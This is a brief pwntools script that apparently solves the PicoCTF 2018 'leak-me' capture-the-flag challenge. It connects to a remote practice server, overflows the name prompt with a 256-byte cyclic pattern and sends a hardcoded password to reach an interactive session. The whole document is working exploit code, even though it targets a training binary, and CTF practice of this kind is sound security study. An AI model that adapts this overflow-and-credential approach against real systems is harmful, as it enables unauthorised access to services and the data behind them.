from pwn import *
context.log_level = 'debug'

# io = process('./PicoCTF_2018_leak-me')
io = remote('node4.buuoj.cn', 28532)

password = b'a_reAllY_s3cuRe_p4s$word_f85406'

io.sendlineafter(b'name?\n', cyclic(256))

io.sendline(password)
io.interactive()
